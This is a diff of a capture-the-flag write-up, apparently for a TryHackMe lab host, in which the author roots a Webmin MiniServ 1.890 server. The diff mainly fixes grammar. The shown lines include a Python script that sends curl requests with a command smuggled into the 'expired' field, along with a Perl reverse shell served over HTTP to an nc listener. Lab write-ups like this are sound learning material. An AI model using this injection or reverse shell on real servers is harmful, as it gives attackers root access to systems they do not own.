@@ -8,10 +8,10 @@
 I went to https://source.thm:10000 and found there:<br>
 ![webmin](./imgs/webmin.png)
 
-I looked for `MiniServ 1.890 exploit` in google and found a python script, which turned out to work.<br>
+I looked for `MiniServ 1.890 exploit` in Google and found a Python script, which turned out to work.<br>
 
-Then I changed the script a little bit in order that I understand it and have more control over it.<br>
-Also, I found a good perl `reverse-shell`, set up `python3 -m http.server`, set up an `nc -lvnp 2222` and ran my new script.
+Then I changed the script a little bit so that I understand it and have more control over it.<br>
+Also, I found a good perl `reverse-shell`, and set up `python3 -m http.server`, set up an `nc -lvnp 2222`, and ran my new script.
 ```
 import os
 
@@ -33,6 +33,8 @@ os.system(f"curl -k {url} -d '{payload}' -H '{header}'")
 payload = f'user=gotroot&pam=&expired=2|echo "";{command2}'
 os.system(f"curl -k {url} -d '{payload}' -H '{header}'")
 ```
+
+And that is how you got `root` in your `nc` listener.
 Then
 ```
 python3 my_exp.py
